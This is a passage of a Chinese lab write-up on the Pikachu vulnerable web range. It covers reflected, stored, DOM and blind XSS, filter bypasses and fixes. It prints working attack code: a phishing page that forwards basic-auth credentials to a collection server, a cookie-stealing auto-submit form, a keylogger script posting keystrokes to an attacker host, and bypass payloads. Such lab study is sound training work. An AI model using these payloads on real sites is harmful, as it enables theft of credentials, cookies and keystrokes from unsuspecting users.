XSS漏洞的防范总体可以概括为“对输入进行过滤”和“对输出进行转义”，但是针对不同地方、不同功能点的防范方式及要考虑的方面也是不尽相同的。如0x08与0x09小节就是很好的例子。","slug":"WEB漏洞靶场pikachu-xss","published":1,"updated":"2019-03-22T03:27:54.167Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83n800667or09g25saop","content":"<h3 id=\"一、前面的话\"><a href=\"#一、前面的话\" class=\"headerlink\" title=\"一、前面的话\"></a>一、前面的话</h3><h4 id=\"0x00-XSS可以分为如下几种常见类型\"><a href=\"#0x00-XSS可以分为如下几种常见类型\" class=\"headerlink\" title=\"0x00 XSS可以分为如下几种常见类型\"></a>0x00 XSS可以分为如下几种常见类型</h4><blockquote>\n<ul>\n<li>反射性XSS</li>\n<li>存储型XSS</li>\n<li>DOM型XSS</li>\n</ul>\n</blockquote>\n<h4 id=\"0x01-XSS漏洞的防范\"><a href=\"#0x01-XSS漏洞的防范\" class=\"headerlink\" title=\"0x01 XSS漏洞的防范\"></a>0x01 XSS漏洞的防范</h4><blockquote>\n<p>一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p>\n</blockquote>\n<ul>\n<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</li>\n<li>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"0x02-XSS过滤的简单绕过\"><a href=\"#0x02-XSS过滤的简单绕过\" class=\"headerlink\" title=\"0x02 XSS过滤的简单绕过\"></a>0x02 XSS过滤的简单绕过</h4><blockquote>\n<ul>\n<li>前端过滤绕过，抓包拦截改包即可。</li>\n<li>大小写绕过：<code>&lt;SciPt&gt;alert(1)&lt;/sCIpt&gt;</code>（JavaScript大小写敏感，但HTML大小写不敏感）</li>\n<li>双写绕过：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>\n<li>注释干扰：<code>&lt;scri&lt;!-- comment--&gt;pt&gt;alert(1)&lt;/sc&lt;!-- comment --&gt;ript&gt;</code></li>\n<li>编码绕过：注意前端编码解码机制。</li>\n</ul>\n</blockquote>\n<p>不同类型的XSS利用方式都差不多，目标是让其执行JS代码，因此在下面的例子中每个点只用一种漏洞利用方式。</p>\n<h3 id=\"二、XSS\"><a href=\"#二、XSS\" class=\"headerlink\" title=\"二、XSS\"></a>二、XSS</h3><h4 id=\"0x00-反射型XSS（GET）\"><a href=\"#0x00-反射型XSS（GET）\" class=\"headerlink\" title=\"0x00 反射型XSS（GET）\"></a>0x00 反射型XSS（GET）</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个输入框。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321091305.png\" alt></p>\n<p>随意输入内容，点击submit。可以发现我们输入的内容会被以GET的形式提交到服务器，并且会被放到响应页面中返回。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321091552.png\" alt></p>\n<p>直接尝试最简单的测试Payload：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>（输入框有长度限制，直接在URL里输入）。我们输入的数据被当作JS代码执行，成功弹窗。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321092149.png\" alt></p>\n<p><strong>漏洞利用(钓鱼攻击)</strong></p>\n<p>简单的重定向钓鱼：</p>\n<p>只需要将Payload改为：<code>&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code>。</p>\n<p><code>http://www.evil.com</code>为要重定向到的地址，即钓鱼页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321093958.png\" alt></p>\n<p>接着诱导用户点击我们插入了Payload的链接，页面就会重定向到指定的钓鱼页面。</p>\n<p>Basic验证钓鱼：</p>\n<p>让用户访问我们插入了Payload的链接后，链接中的JS会被执行，执行结果就是请求fish.php，该文件会返回一个basic验证框。输入用户名密码后，会被发到我们的服务器。</p>\n<p>Payload：<code>&lt;script src=http://localhost/fish.php&gt;&lt;/script&gt;</code></p>\n<p>fish.php内容：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">// var_dump($_SERVER);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((!<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_USER'</span>])) || (!<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_PW'</span>]))) &#123;</span><br><span class=\"line\"><span class=\"comment\">//发送认证框，并给出迷惑性的info</span></span><br><span class=\"line\">    header(<span class=\"string\">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">\"WWW-Authenticate: Basic realm='认证'\"</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'HTTP/1.0 401 Unauthorized'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Authorization Required.'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_USER'</span>])) &amp;&amp; (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_PW'</span>])))&#123;</span><br><span class=\"line\"><span class=\"comment\">//将结果发送给搜集信息的后台,请将这里的IP地址修改为我们服务器的IP</span></span><br><span class=\"line\">    header(<span class=\"string\">\"Location: http://192.168.100.126/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;</span></span><br><span class=\"line\"><span class=\"string\">    &amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>诱导用户点击链接：<code>192.168.100.126/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script src=http://localhost/fish.php&gt;&lt;/script&gt;&amp;submit=submit</code>，弹出验证框：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321140505.png\" alt></p>\n<p>输入用户名密码点击确定后，我们服务器的访问日志中发现用户名密码：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321140720.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>用户在URL中提交的message参数的值会被服务器获取，然后未经任何过滤就拼接到字符串<code>$html</code>中。</p>\n<p>接着会在返回给用户的页面中直接输出打印<code>$html</code>变量。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321095133.png\" alt></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321095226.png\" alt></p>\n<h4 id=\"0x01-反射型XSS（POST）\"><a href=\"#0x01-反射型XSS（POST）\" class=\"headerlink\" title=\"0x01 反射型XSS（POST）\"></a>0x01 反射型XSS（POST）</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个登录页面，经过测试登录框不存在XSS，那么先进行登录，登录进去后会有一个输入框。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321113514.png\" alt></p>\n<p>在输入框中输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>进行测试。成功弹窗。</p>\n<p><strong>漏洞利用（窃取Cookie）</strong></p>\n<p>该漏洞类型属于POST型反射XSS，因为数据是通过POST方式提交的。</p>\n<p>POST方式提交数据导致我们不能像GET方式那样，在URL中插入Payload诱导用户点击即可完成攻击。</p>\n<p>POST型反射XSS漏洞利用（窃取Cookie）思路：</p>\n<p>实际上是CSRF配合XSS。</p>\n<p>在自己的服务器编写一个HTML文件，当访问该文件时，里面的JS会执行，执行效果是会自动提交POST数据。</p>\n<p>诱导用户点击我们编写的HTML文件的URL。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321115915.png\" alt></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">\t\t<span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  \t\t\t<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"postsubmit\"</span>).click();</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://192.168.100.26/pikachu/vul/xss/xsspost/xss_reflected_post.php\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"xssr_in\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"message\"</span> <span class=\"attr\">value</span>=</span></span><br><span class=\"line\">    \"&lt;script&gt;</span><br><span class=\"line\">\t\tdocument.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\" /&gt;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"postsubmit\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"submit\"</span> /&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>查看服务器访问日志，发现Cookie被发回：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321131526.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>与GET方式的差别在于提交数据的方式不一样而已，其他都是一样的。</p>\n<h4 id=\"0x02-存储型XSS\"><a href=\"#0x02-存储型XSS\" class=\"headerlink\" title=\"0x02 存储型XSS\"></a>0x02 存储型XSS</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个留言的功能页面，随意输入然后提交，留言内容会被存储到数据库，然后输出到页面上。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321132302.png\" alt></p>\n<p>输入<code>&lt;script&gt;alert(/xss/)&lt;/scipt&gt;</code>并提交，JS被成功执行并弹窗。</p>\n<p><strong>漏洞利用（键盘记录）</strong></p>\n<p>JS Payload文件：</p>\n<p>该JS文件作用是监听键盘记录，并将键盘记录通过AJAX请求发送到我们的服务器。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createAjax</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> request=<span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">        request=<span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(request.overrideMimeType)&#123;</span><br><span class=\"line\">            request.overrideMimeType(<span class=\"string\">\"text/xml\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.ActiveXObject)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> versions=[<span class=\"string\">'Microsoft.XMLHTTP'</span>, <span class=\"string\">'MSXML.XMLHTTP'</span>, <span class=\"string\">'Msxml2.XMLHTTP.7.0'</span>,<span class=\"string\">'Msxml2.XMLHTTP.6.0'</span>,<span class=\"string\">'Msxml2.XMLHTTP.5.0'</span>, <span class=\"string\">'Msxml2.XMLHTTP.4.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP.3.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i&lt;versions.length; i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                request=<span class=\"keyword\">new</span> ActiveXObject(versions[i]);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(request)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> request;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">                request=<span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> request;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> ajax=<span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xl=<span class=\"string\">\"datax=\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">onkeypress</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> realkey = <span class=\"built_in\">String</span>.fromCharCode(event.keyCode);</span><br><span class=\"line\">    xl+=realkey;</span><br><span class=\"line\">    show();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">document</span>.onkeypress = onkeypress;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    ajax = createAjax();</span><br><span class=\"line\">    ajax.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ajax.readyState == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ajax.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> data = ajax.responseText;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"页面请求失败\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> postdate = xl;</span><br><span class=\"line\">    ajax.open(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"http://192.168.1.15/rserver.php\"</span>,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    ajax.setRequestHeader(<span class=\"string\">\"Content-type\"</span>, <span class=\"string\">\"application/x-www-form-urlencoded\"</span>);</span><br><span class=\"line\">    ajax.setRequestHeader(<span class=\"string\">\"Content-length\"</span>, postdate.length);</span><br><span class=\"line\">    ajax.setRequestHeader(<span class=\"string\">\"Connection\"</span>, <span class=\"string\">\"close\"</span>);</span><br><span class=\"line\">    ajax.send(postdate);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>rserver.php</code>是我们服务器上用于接收键盘记录的页面。这里不能再使用任意URL然后看访问日志的方式。因为AJAX请求默认是受同源策略影响的，不能跨域进行请求。解决跨域请求的一个方法是，要请求的目标服务器在响应消息的头部中使用<code>Access-Control-Allow-Origin:xxx.com</code>来允许某些域可以发起跨域请求。</p>\n<p>由于我们的目的就是要让它跨域发起请求发到我们的服务器上，所以我们用于接收键盘记录的页面编写为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置允许被任意域跨域访问</span></span><br><span class=\"line\">header(<span class=\"string\">\"Access-Control-Allow-Origin:*\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$data = $_POST[<span class=\"string\">'datax'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//保存到数据库</span></span><br><span class=\"line\">.......</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在留言处输入Payload<code>&lt;script src=http://192.168.100.126/evil.js&gt;&lt;/script&gt;</code>。之后在网页上按下的键都会被记录并发送到我们的接收页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321153844.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>用户的留言提交到服务器后，服务器只进行了防SQLi的转义就直接保存到数据库中。访问留言页面时，会从数据库中把留言记录查询出来直接输出打印在页面中。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321154523.png\" alt></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321154819.png\" alt></p>\n<h4 id=\"0x03-DOM-XSS-输入框\"><a href=\"#0x03-DOM-XSS-输入框\" class=\"headerlink\" title=\"0x03 DOM XSS(输入框)\"></a>0x03 DOM XSS(输入框)</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，有一个输入框，点击<code>Click me</code>，会出现一个<code>&lt;a&gt;</code>标签，猜测应该是JS操作DOM添加了一个标签。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321160027.png\" alt></p>\n<p>查看页面源代码，找到对应的JS，可以发现我们在输入框输入的数据会被直接拼接在<code>&lt;a&gt;</code>标签，然后将新创建的<code>&lt;a&gt;</code>标签直接插入HTML中：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321160530.png\" alt></p>\n<p>我们只要考虑闭合就可以随意插入JS代码。</p>\n<p>在输入框输入：<code>#&#39; onmouseover=&quot;alert(/xss/)&quot;&gt;</code>，鼠标移动到<code>&lt;a&gt;</code>标签上，成功弹窗。</p>\n<p>该漏洞比较鸡肋。</p>\n<h4 id=\"0x04-DOM-XSS（URL）\"><a href=\"#0x04-DOM-XSS（URL）\" class=\"headerlink\" title=\"0x04 DOM XSS（URL）\"></a>0x04 DOM XSS（URL）</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面后，操作与上一节一样，直接查看源代码，找到对应的JS。</p>\n<p>由JS代码可知我们可以在URL中的text参数构造payload，然后点击页面的<code>&lt;a&gt;</code>标签，我们的payload就会被插入到HTML中。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321162028.png\" alt></p>\n<p>构造text参数的值为：<code>&#39; onclick=&quot;alert(/xss/)&quot;&gt;</code></p>\n<p>先点击<code>有些事费尽心思.......</code></p>\n<p>再点击<code>就让往事都随风......</code></p>\n<p><strong>漏洞利用</strong></p>\n<p>该漏洞相对于上一节的DOM XSS漏洞要有危害得多，因为诱导用户点击链接就能完成攻击。</p>\n<p>漏洞利用参照前面几节，都是差不多的。</p>\n<h4 id=\"0x05-XSS盲打\"><a href=\"#0x05-XSS盲打\" class=\"headerlink\" title=\"0x05 XSS盲打\"></a>0x05 XSS盲打</h4><p>XSS盲打是指输入的数据不确定会被输出到哪个页面，只能尝试性使用Payload。</p>\n<p>XSS Blind 本质上也是存储型的XSS。</p>\n<p><strong>漏洞挖掘</strong></p>\n<p>打开页面，有输入框需要输入数据。输入的数据会被提交到服务器中，但是我们并不能确定我们输入的数据会被输出在哪个页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322090316.png\" alt></p>\n<p>输入简单的payload测试：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322090957.png\" alt></p>\n<p>在本例中，我们输入的数据会被保存到数据库，然后输出在管理员后台页面中，当我们插入xss的payload，管理员登录后台管理时就会被攻击，危害相当大。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322091345.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>我们输入的数据未经过任何过滤处理就会被直接保存在服务器中。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322091944.png\" alt></p>\n<p>后台页面会从数据库中读取数据，输出到页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322092322.png\" alt></p>\n<h4 id=\"0x06-简单XSS过滤绕过\"><a href=\"#0x06-简单XSS过滤绕过\" class=\"headerlink\" title=\"0x06 简单XSS过滤绕过\"></a>0x06 简单XSS过滤绕过</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，有一个输入框，输入一个XSS探针Payload来检测是否做了过滤，对什么做了过滤，XSS探针：</p>\n<blockquote>\n<p><code>&quot;&#39;&lt;script javascript onload src&gt;&lt;a href&gt;&lt;/a&gt;#$%^</code></p>\n</blockquote>\n<p>输入探针后点击提交，然后查看页面源代码，确定过滤，发现<code>&lt;</code>、<code>script</code>、<code>javascript</code>直接被过滤了。但是其他并没有被过滤。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322094644.png\" alt></p>\n<p>使用<code>&lt;a&gt;</code>标签、<code>&lt;img&gt;</code>标签就可以绕过过滤。使用Payload：<code>&lt;img src=x onerror=alert(1)&gt;</code>，成功弹窗。</p>\n<p><strong>漏洞分析</strong></p>\n<p>采用了正则进行过滤，我们除了可以使用<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>登其他标签之外，还可以使用大写的<code>script</code>标签绕过。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322095504.png\" alt></p>\n<h4 id=\"0x07-XSS-htmlspecialchars-过滤绕过\"><a href=\"#0x07-XSS-htmlspecialchars-过滤绕过\" class=\"headerlink\" title=\"0x07 XSS htmlspecialchars()过滤绕过\"></a>0x07 XSS htmlspecialchars()过滤绕过</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面时一个登录框，继续同上一节的操作，插入XSS探针然后查看页面源代码，可以看到一些特殊字符被实体编码了：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322100707.png\" alt></p>\n<p>但可以注意到单引号并没有被转义，因此可以使用Payload：<code>&#39; onmouseover=alert(1) &#39;</code></p>\n<p><strong>漏洞分析</strong></p>\n<p>分析源代码可知，后端使用<code>htmlspecialchars()</code>函数对用户的提交的数据进行了转义：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322101307.png\" alt></p>\n<p>但是存在一个问题，<code>htmlspecialchars()</code>函数默认是不对单引号进行转义的，要想连单引号一起转义，需要给函数传入参数<code>ENT_QUOTES</code>。</p>\n<p><code>htmlspecialchars()</code>函数把预定义的字符转换为 HTML实体。</p>\n<blockquote>\n<p>预定义的字符是：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;   &amp;  转为 `&amp;amp;` </span><br><span class=\"line\">&gt;   &quot;  转为 `&amp;quot;`</span><br><span class=\"line\">&gt;   &apos;  转为 `&amp;#039;` </span><br><span class=\"line\">&gt;   &lt;  转为 `&amp;lt;` </span><br><span class=\"line\">&gt;   &gt;  转为 `&amp;gt;`</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>可用的引号类型： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; ENT_COMPAT - 默认。仅编码双引号。 </span><br><span class=\"line\">&gt; ENT_QUOTES - 编码双引号和单引号。 </span><br><span class=\"line\">&gt; ENT_NOQUOTES - 不编码任何引号。</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>漏洞修复</strong></p>\n<p>使用<code>htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)</code>,而不是<code>htmlspecialchars($GET[&#39;message&#39;])</code>。</p>\n<h4 id=\"0x08-XSS-href输出\"><a href=\"#0x08-XSS-href输出\" class=\"headerlink\" title=\"0x08 XSS href输出\"></a>0x08 XSS href输出</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面继续使用XSS探针进行测试，可以发现特殊字符都被转义了，包括单引号。猜测使用了<code>htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)</code>对提交的数据进行转义。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322102841.png\" 